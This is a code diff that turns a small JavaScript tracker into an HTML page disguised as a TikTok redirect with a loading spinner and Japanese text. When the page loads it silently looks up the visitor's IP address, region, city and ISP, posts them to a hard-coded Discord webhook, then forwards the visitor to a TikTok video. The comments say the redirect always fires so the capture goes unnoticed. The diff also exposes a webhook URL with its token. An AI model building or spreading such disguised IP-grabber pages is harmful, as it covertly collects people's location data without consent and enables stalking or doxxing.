@@ -1,34 +1,52 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
-const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Redirecting...</title>
+    <style>
+        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p>TikTokを開いています...</p>
+    </div>
 
-async function track() {
-    // 1. 何があっても必ず2.5秒後にはTikTokに飛ばす設定
-    const forceRedirect = setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-    }, 2500);
+    <script>
+        // 設定
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU";
+        const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
 
-    try {
-        // 2. IP情報を取得（ここで止まっても上記タイマーで飛ばされます）
-        const response = await fetch('https://ipwho.is/').catch(() => null);
-        if (!response) return;
-        
-        const data = await response.json();
-        if (!data || !data.success) return;
+        async function start() {
+            // 3秒後に強制移動するタイマー（何があっても絶対に飛ばす）
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
 
-        // 3. Discordに送信（送信が終わるのを待たずに次に進みます）
-        if (WEBHOOK_URL) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `👤 **アクセス情報**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
-                })
-            }).catch(() => {}); // 送信エラーも無視して進む
+            try {
+                // IP情報を取得
+                const res = await fetch('https://ipwho.is/').catch(() => null);
+                if (!res) return;
+                const data = await res.json();
+
+                // Discordに送信
+                if (data && data.success && WEBHOOK_URL) {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `✅ **アクセス検出成功**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}`
+                        })
+                    }).catch(() => {});
+                }
+            } catch (e) {}
         }
-    } catch (e) {
-        // 全てのエラーを無視
-    }
-}
 
-// 実行
-track();
+        // 実行
+        start();
+    </script>
+</body>
+</html>
